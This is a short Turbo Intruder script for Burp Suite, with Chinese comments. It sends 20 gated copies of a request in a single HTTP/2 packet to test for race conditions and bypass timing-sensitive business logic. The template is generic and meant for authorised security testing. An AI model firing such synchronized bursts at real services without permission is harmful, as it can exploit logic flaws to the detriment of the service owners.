"""
单包竞态攻击脚本 - Turbo Intruder

功能说明：
这是一个专门用于执行单包竞态攻击（Single-Packet Attack）的脚本。
利用HTTP/2的特性，在单个TCP包中发送多个请求，实现精确的时序攻击。

使用场景：
- 竞态条件漏洞测试
- 状态机攻击
- 并发处理缺陷检测
- 时序敏感的业务逻辑绕过

使用方法：
1. 确保目标支持HTTP/2协议
2. 在Burp Suite中选择目标请求
3. 发送到Turbo Intruder
4. 选择此脚本模板
5. 观察响应时间戳，负数表示服务器在请求完成前就响应了

引擎选择：
- HTTP/2支持：使用Engine.BURP2（推荐）
- 仅HTTP/1：使用Engine.THREADED或Engine.BURP
- 更多信息：https://portswigger.net/research/smashing-the-state-machine

参数说明：
- concurrentConnections: 1（单连接确保同步）
- gate: 'race1'（门控标签，控制请求同步发送）
- 请求数量: 20个（可根据需要调整）

注意事项：
- 负时间戳表示服务器提前响应
- 适用于状态机攻击场景
- 需要目标支持HTTP/2协议
"""

def queueRequests(target, wordlists):

    # 如果目标支持HTTP/2，使用Engine.BURP2触发单包攻击
    # 如果只支持HTTP/1，使用Engine.THREADED或Engine.BURP
    # 更多信息请查看：https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,         # 单连接确保同步
                           engine=Engine.BURP2              # HTTP/2引擎
                           )

    # 'gate'参数会暂停请求的一部分，直到调用openGate()
    # 如果看到负时间戳，说明服务器在请求完成前就响应了
    for i in range(20):
        engine.queue(target.req, gate='race1')  # 使用gate标签控制同步

    # 当所有标记为'race1'的请求都排队后
    # 调用engine.openGate()同步发送它们
    engine.openGate('race1')


def handleResponse(req, interesting):
    # 记录所有响应，特别关注时间戳
    table.add(req)
